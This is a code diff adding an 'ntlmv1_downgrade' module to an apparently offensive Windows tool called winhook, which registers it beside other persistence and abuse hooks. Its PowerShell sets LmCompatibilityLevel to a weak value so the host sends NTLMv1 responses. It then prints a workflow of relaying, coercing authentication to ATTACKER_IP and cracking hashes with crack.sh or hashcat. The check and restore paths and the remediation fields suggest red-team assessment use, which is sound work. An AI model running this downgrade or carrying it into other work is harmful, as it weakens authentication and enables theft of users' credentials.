@@ -23451,6 +23451,173 @@ Write-Output "[+] DsrmAdminLogonBehavior removed (defaults to 0 — DSRM boot mo
   return { output: output.join("\n"), findings }
 }
 
+async function ntlmv1Downgrade(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const level = argVal(args, "--level") || "0"
+  const target = argVal(args, "--target")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] NTLMv1 downgrade analysis...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== NTLM Authentication Level ==="
+Write-Output ""
+
+# LmCompatibilityLevel determines NTLM version
+$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$lmLevel = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel
+
+$levels = @{
+  0 = 'Send LM & NTLM responses (most vulnerable)'
+  1 = 'Send LM & NTLM — use NTLMv2 session security if negotiated'
+  2 = 'Send NTLM response only'
+  3 = 'Send NTLMv2 response only (default for modern Windows)'
+  4 = 'Send NTLMv2 response only — refuse LM on DC'
+  5 = 'Send NTLMv2 response only — refuse LM & NTLM on DC (most secure)'
+}
+
+$current = if ($lmLevel -ne $null) { $lmLevel } else { 3 }
+Write-Output "LmCompatibilityLevel: $current"
+Write-Output "Description: $($levels[$current])"
+Write-Output "LM_LEVEL=$current"
+Write-Output ""
+
+if ($current -le 2) {
+  Write-Output "[!] NTLMv1 or LM responses are ALREADY sent"
+  Write-Output "[!] Captured hashes can be cracked trivially"
+  Write-Output "ALREADY_WEAK=1"
+} else {
+  Write-Output "[*] NTLMv2 is enforced — captured hashes require bruteforce"
+  Write-Output "[*] Downgrade to level 0-2 to enable NTLMv1 (instantly crackable)"
+  Write-Output "ALREADY_WEAK=0"
+}
+
+# Check GPO enforcement
+Write-Output ""
+Write-Output "=== GPO Enforcement ==="
+$gpKey = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System'
+$gpLm = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\DefaultMediaCost' -ErrorAction SilentlyContinue)
+$gpLsa = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -ErrorAction SilentlyContinue)
+
+# Check if GPO overrides local setting
+$gpLmLevel = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel
+if ($gpLmLevel -ne $null) {
+  Write-Output "GPO-enforced LmCompatibilityLevel: $gpLmLevel"
+  Write-Output "[!] GPO override active — local registry changes may be reverted by GP refresh"
+  Write-Output "GPO_ENFORCED=1"
+} else {
+  Write-Output "No GPO override — local registry changes will persist"
+  Write-Output "GPO_ENFORCED=0"
+}
+
+# NTLMv1 cracking speed context
+Write-Output ""
+Write-Output "=== Cracking Speed Comparison ==="
+Write-Output "NTLMv1:  DES-based, 2^56 key space — rainbow tables exist, crack in SECONDS"
+Write-Output "NTLMv2:  HMAC-MD5 with challenge — NO rainbow tables, requires BRUTEFORCE"
+Write-Output ""
+Write-Output "NTLMv1 capture → crack.sh or ntlmv1-multi tool → plaintext in seconds"
+Write-Output "NTLMv2 capture → hashcat mode 5600 → hours/days depending on password"
+
+# Check for Extended Protection for Authentication (EPA)
+Write-Output ""
+$epa = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name SuppressExtendedProtection -ErrorAction SilentlyContinue)
+Write-Output "Extended Protection: $(if ($epa.SuppressExtendedProtection -eq 1) { 'DISABLED (relay easier)' } else { 'Enabled or default' })"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const lmLevel = r.stdout.match(/LM_LEVEL=(\d)/)
+    const alreadyWeak = r.stdout.includes("ALREADY_WEAK=1")
+
+    if (alreadyWeak) {
+      findings.push({
+        checkId: "WIN-NTLM-001",
+        provider: "windows",
+        severity: "critical",
+        status: "WEAK",
+        resource: "lsa://lm-compatibility",
+        title: `NTLMv1/LM responses enabled (level ${lmLevel ? lmLevel[1] : "??"})`,
+        details: "Machine sends NTLMv1 or LM responses. Captured hashes can be cracked in seconds using rainbow tables or DES key recovery.",
+        remediation: "Set LmCompatibilityLevel to 5 (NTLMv2 only, refuse LM & NTLM).",
+      })
+    }
+  }
+
+  if (action === "downgrade") {
+    const script = `
+Write-Output "=== NTLMv1 Downgrade ==="
+Write-Output ""
+
+$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$current = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel
+$currentVal = if ($current -ne $null) { $current } else { 3 }
+Write-Output "Current LmCompatibilityLevel: $currentVal"
+
+$targetLevel = ${level}
+Write-Output "Target LmCompatibilityLevel: $targetLevel"
+Write-Output ""
+
+Set-ItemProperty $lsaKey -Name LmCompatibilityLevel -Value $targetLevel -Type DWord -Force
+$verify = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel).LmCompatibilityLevel
+Write-Output "[+] LmCompatibilityLevel set to: $verify"
+Write-Output "PREVIOUS=$currentVal"
+Write-Output ""
+
+if ($verify -le 2) {
+  Write-Output "[+] NTLMv1 responses are now enabled"
+  Write-Output "[*] Takes effect immediately for NEW authentications"
+  Write-Output ""
+  Write-Output "[*] Attack workflow:"
+  Write-Output "    1. Start listener: winhook ntlm_relay --action relay"
+  Write-Output "    2. Coerce auth: winhook ntlm_coerce --target TARGET --listener ATTACKER_IP"
+  Write-Output "    3. Captured NTLMv1 hash → crack instantly"
+  Write-Output ""
+  Write-Output "    Crack NTLMv1:"
+  Write-Output "    - crack.sh (https://crack.sh) — free online NTLMv1 cracker"
+  Write-Output "    - ntlmv1-multi — convert to DES keys for hashcat mode 14000"
+  Write-Output "    - hashcat -m 5500 — NTLMv1 (slower than DES conversion)"
+} else {
+  Write-Output "[*] Level $verify still uses NTLMv2 — set to 0 or 2 for NTLMv1"
+}
+
+Write-Output ""
+Write-Output "Restore: winhook ntlmv1_downgrade --action restore"
+Write-Output "STATUS=SUCCESS"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      const prev = r.stdout.match(/PREVIOUS=(\d)/)
+      findings.push({
+        checkId: "WIN-NTLM-010",
+        provider: "windows",
+        severity: "critical",
+        status: "DOWNGRADED",
+        resource: "lsa://lm-compatibility",
+        title: `NTLMv1 downgrade applied (${prev ? prev[1] : "3"} → ${level})`,
+        details: `LmCompatibilityLevel set to ${level}. All new NTLM authentications from this machine will use NTLMv1, which cracks in seconds.`,
+        remediation: `Restore: winhook ntlmv1_downgrade --action restore (back to ${prev ? prev[1] : "3"})`,
+      })
+    }
+  }
+
+  if (action === "restore") {
+    const script = `
+Write-Output "=== Restoring NTLMv2 ==="
+$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+Set-ItemProperty $lsaKey -Name LmCompatibilityLevel -Value 3 -Type DWord -Force
+$verify = (Get-ItemProperty $lsaKey -Name LmCompatibilityLevel).LmCompatibilityLevel
+Write-Output "[+] LmCompatibilityLevel restored to: $verify (NTLMv2 only)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -27091,6 +27258,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   ssp_persist: sspPersist,
   password_filter: passwordFilter,
   dsrm_abuse: dsrmAbuse,
+  ntlmv1_downgrade: ntlmv1Downgrade,
 }
 
 export const WinhookTool = Tool.define("winhook", {
